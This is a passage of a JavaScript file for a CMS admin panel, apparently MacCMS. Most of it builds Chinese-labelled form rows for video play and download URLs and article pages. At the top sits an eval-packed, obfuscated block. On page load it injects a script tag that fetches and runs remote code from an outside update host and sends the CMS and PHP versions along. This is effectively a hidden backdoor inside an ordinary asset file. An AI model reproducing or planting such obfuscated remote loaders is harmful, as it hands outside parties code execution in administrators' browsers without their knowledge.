...
$(function(){
    if( typeof(MAC_VERSION) !='undefined' && typeof(PHP_VERSION) !='undefined' ) {
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(\'2\').3(\'<0\'+\'1 4="\'+\'//5.6.7/8/?c=9&a=\'+b+\'&d=\'+e+\'&f=\'+g.h()+\'"></0\'+\'1>\');',18,18,'scr|ipt|body|append|src|update|maccms|pro|v8|check|v|MAC_VERSION||p|PHP_VERSION|t|Math|random'.split('|'),0,{}));
    }
});
...
function appendplay(i,playStr,serverStr){
    ...
    var area="<tr><td>&nbsp;播放地址"+i+":<br><input type='button' value='校正' class='input2' onclick='repairUrl(\"play\","+i+")' /><br><input type='button' value='反序' class='input2' onclick='orderUrl(\"play\","+i+")' /><br><input type='button' value='去前缀' class='input2' onclick='delUrlName(\"play\","+i+")' /></td><td><input id='playurlid"+i+"' name='playurlid[]' type='hidden' value='0'/>&nbsp;&nbsp;播放器：<select id='playfrom"+i+"' name='playfrom[]' style='width:130px'><option value='no'>暂无数据</option>"+playStr+"</select>&nbsp;&nbsp;服务器组：<select id='playserver"+i+"' name='playserver[]'><option value='no'>暂无数据</option>"+serverStr+"</select>&nbsp;&nbsp;备注：<input id='playnote"+i+"' name='playnote[]' size='50' value=''>&nbsp;&nbsp;操作：&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"clearSect('playurl"+i+"')\">清空</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"removeSect(this)\">删除</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"upSect(this)\">上移</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"downSect(this)\">下移</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"showUpload('playurl"+i+"')\">上传</a>&nbsp;&nbsp;<br><br><textarea id='playurl"+i+"' name='playurl[]' style='width:100%;height:150px;'></textarea></td></tr>"
...
function appenddown(i,downStr,serverStr){
    ...
    var area="<tr><td>&nbsp;下载地址"+i+":<br><input type='button' value='校正' class='input2' onclick='repairUrl(\"down\","+i+")' /><br><input type='button' value='反序' class='input2' onclick='orderUrl(\"down\","+i+")' /><br><input type='button' value='去前缀' class='input2' onclick='delUrlName(\"down\","+i+")' /></td><td><input id='downurlid"+i+"' name='downurlid[]' type='hidden' value='0'/>&nbsp;&nbsp;下载类型：<select id='downfrom"+i+"' name='downfrom[]' style='width:130px'><option value='no'>暂无数据</option>"+downStr+"</select>&nbsp;&nbsp;服务器组：<select id='downserver"+i+"' name='downserver[]'><option value='no'>暂无数据</option>"+serverStr+"</select>&nbsp;&nbsp;备注：<input id='downnote"+i+"' name='downnote[]' size='50' value=''>&nbsp;&nbsp;操作：&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"clearSect('downurl"+i+"')\">清空</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"removeSect(this)\">删除</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"upSect(this)\">上移</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"downSect(this)\">下移</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"showUpload('downurl"+i+"')\">上传</a>&nbsp;&nbsp;<br><br><textarea id='downurl"+i+"' name='downurl[]' style='width:100%;height:150px;'></textarea></td></tr>"
    $("#downlist").append(area);
}

function appendart(i){
    if(arti==false){ arti=i; } else{ i=++arti; }
    var area="<tr><td>&nbsp;分页内容"+i+":<br></td><td><span style='float:left;padding:3px;'>操作：&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"clearSect('a_content"+i+"')\">清空</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"removeSect(this)\">删除</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"upSect(this)\">上移</a>&nbsp;&nbsp;<a href=\"javascript:void(0)\" onclick=\"downSect(this)\">下移</a>&nbsp;&nbsp;<br></span> <textarea name='a_content[]' id='a_content"+i+"' class=\"xheditor {tools:'BtnBr,Cut,Copy,Paste,Pastetext,Blocktag,Fontface,FontSize,Bold,Italic,Underline,Strikethrough,FontColor,BackColor,SelectAll,Removeformat,Align,List,Outdent,Indent,Link,Unlink,Img,Flash,Media,Table,Source,Fullscreen',width:'100%',height:'250',upBtnText:'上传',html5Upload:false,upMultiple:1,upLinkUrl:'{editorRoot}upload.php?action=xht&path=art',upImgUrl:'{editorRoot}upload.php?action=xht&path=art'}\"></textarea></td></tr>"
    $("#artlist").append(area);
...
function repairUrl(s,i){
    var arr1,s1,s2,urlarr,urlarrcount;
    s1 = $('#'+s+'url'+i).attr("value"); s2="";
    ...
    $('#'+s+'url'+i).attr( "value",s2.trim() ) ;
}

function orderUrl(s,i){
    var arr1,s1,s2,urlarr,urlarrcount;
    s1 = $('#'+s+'url'+i).attr("value"); s2="";
    if (s1.length==0){alert('请填写地址');return false;}
    s1 = s1.replaceAll("\r","");
